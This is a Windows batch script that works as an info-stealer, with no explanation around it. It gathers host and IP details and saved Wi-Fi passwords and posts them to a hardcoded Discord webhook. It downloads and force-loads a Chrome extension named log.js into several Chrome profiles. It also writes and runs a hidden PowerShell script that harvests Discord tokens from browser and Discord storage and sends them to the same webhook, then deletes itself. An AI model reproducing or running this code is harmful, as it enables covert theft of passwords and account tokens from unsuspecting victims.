@echo off
setlocal enabledelayedexpansion
for /f "tokens=2 delims=:" %%d in ('ipconfig ^| find "IPv4"') do set intip=%%d
for /f %%b in ('powershell -nop -c "(Invoke-RestMethod http://api.ipify.org)"') Do Set ExtIP=%%b
set webhook=https://discord.com/api/webhooks/992795386412552192/H5WZSk1MbeEj2mf2lV78BG-J2wLPSr3q5QTUkFSYxLk1eUdY9VHK6QYgq4wxnqZxqEL2
echo         PC         >>%appdata%\info.txt
echo ------------------->>%appdata%\info.txt
echo Username: %username%>>%appdata%\info.txt
echo Hostname: %computername%>>%appdata%\info.txt
echo Private IP: %intip%>>%appdata%\info.txt
echo Public IP: %ExtIP%>>%appdata%\info.txt
echo CPU architechture: %processor_architecture%>>%appdata%\info.txt
echo Operating System: %os%>>%appdata%\info.txt
echo System Drive: %systemdrive%>>%appdata%\info.txt
echo.>>%appdata%\info.txt
echo   WI-FI PASSWORDS>>%appdata%\info.txt
echo ------------------->>%appdata%\info.txt
for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
    set wifi_pwd=
    for /F "tokens=2 delims=: usebackq" %%F IN (`netsh wlan show profile %%a key^=clear ^| find "Key Content"`) do (
        set wifi_pwd=%%F
    )
    echo %%a: !wifi_pwd!>>%appdata%\info.txt
)

curl -s -F "file=@%appdata%\info.txt" \ %webhook% >nul 2>&1
if exist %appdata%\extension rmdir %appdata%\extension /S /Q >nul 2>&1
del %appdata%\info.txt
mkdir %appdata%\extension
mkdir %appdata%\extension\scripts
mkdir %appdata%\extension\assets
curl -s https://raw.githubusercontent.com/syskey-del/extension/main/extension/manifest.json>>%appdata%\extension\manifest.json
curl -s https://raw.githubusercontent.com/syskey-del/extension/main/extension/scripts/log.js>>%appdata%\extension\scripts\log.js
curl -s https://raw.githubusercontent.com/syskey-del/extension/main/extension/assets/onedrive.png -o %appdata%\extension\assets\onedrive.png
taskkill /im chrome.exe /f >nul 2>&1
start cmd /c "mode 20, 1 && timeout /t 3 >nul && taskkill /im chrome.exe /f >nul 2>&1"
start cmd /c "mode 20, 1 && timeout /t 6 >nul && taskkill /im chrome.exe /f >nul 2>&1"
start cmd /c "mode 20, 1 && timeout /t 9 >nul && taskkill /im chrome.exe /f >nul 2>&1"
"%programfiles%\Google\Chrome\Application\chrome.exe" --load-extension="%appdata%\extension" --profile-directory="Profile 1"
"%programfiles%\Google\Chrome\Application\chrome.exe" --load-extension="%appdata%\extension" --profile-directory="Profile 2"
"%programfiles%\Google\Chrome\Application\chrome.exe" --load-extension="%appdata%\extension" --profile-directory="Profile 3"
:end
taskkill /im chrome.exe /f >nul 2>&1
rmdir %appdata%\extension /S /Q >nul 2>&1
endlocal
set webhook=https://discord.com/api/webhooks/992795386412552192/H5WZSk1MbeEj2mf2lV78BG-J2wLPSr3q5QTUkFSYxLk1eUdY9VHK6QYgq4wxnqZxqEL2
if exist %appdata%\update.ps1 del /s /q %appdata%\update.ps1 >nul
echo $ErrorActionPreference='silentlycontinue'>>%appdata%\update.ps1
echo $tokensString = new-object System.Collections.Specialized.StringCollection>>%appdata%\update.ps1
echo $webhook_url = "%webhook%">>%appdata%\update.ps1
echo $location_array = @(>>%appdata%\update.ps1
echo     $env:APPDATA + "\Discord\Local Storage\leveldb">>%appdata%\update.ps1
echo     $env:APPDATA + "\discordcanary\Local Storage\leveldb">>%appdata%\update.ps1
echo     $env:APPDATA + "\discordptb\Local Storage\leveldb">>%appdata%\update.ps1
echo     $env:LOCALAPPDATA + "\Google\Chrome\User Data\Default\Local Storage\leveldb">>%appdata%\update.ps1
echo     $env:APPDATA + "\Opera Software\Opera Stable\Local Storage\leveldb">>%appdata%\update.ps1
echo     $env:LOCALAPPDATA + "\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb">>%appdata%\update.ps1
echo     $env:LOCALAPPDATA + "\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb">>%appdata%\update.ps1
echo )>>%appdata%\update.ps1
echo foreach ($path in $location_array) {>>%appdata%\update.ps1
echo     if(Test-Path $path){>>%appdata%\update.ps1
echo         foreach ($file in Get-ChildItem -Path $path -Name) {>>%appdata%\update.ps1
echo             $data = Get-Content -Path "$($path)\$($file)">>%appdata%\update.ps1
echo             $regex = [regex] '[\w]{24}\.[\w]{6}\.[\w]{27}'>>%appdata%\update.ps1
echo             $match = $regex.Match($data)>>%appdata%\update.ps1
echo             while ($match.Success) {>>%appdata%\update.ps1
echo                 if (!$tokensString.Contains($match.Value)) {>>%appdata%\update.ps1
echo                     $tokensString.Add($match.Value) ^| out-null>>%appdata%\update.ps1
echo                 }>>%appdata%\update.ps1
echo                 $match = $match.NextMatch()>>%appdata%\update.ps1
echo             } >>%appdata%\update.ps1
echo         }>>%appdata%\update.ps1
echo     }>>%appdata%\update.ps1
echo }>>%appdata%\update.ps1
echo foreach ($token in $tokensString) {>>%appdata%\update.ps1
echo     $message = ^"** Discord token : **>>%appdata%\update.ps1
echo     ``` $token ``` ^">>%appdata%\update.ps1
echo     $hash = @{ "content" = $message; }>>%appdata%\update.ps1
echo     $JSON = $hash ^| convertto-json>>%appdata%\update.ps1
echo     Invoke-WebRequest -uri $webhook_url -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}>>%appdata%\update.ps1
echo }>>%appdata%\update.ps1
timeout /t 2 >nul
PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\update.ps1 -WindowStyle Hidden >nul
timeout /t 6 >nul
del %appdata%\update.ps1
(goto) 2>nul & del "%~f0"
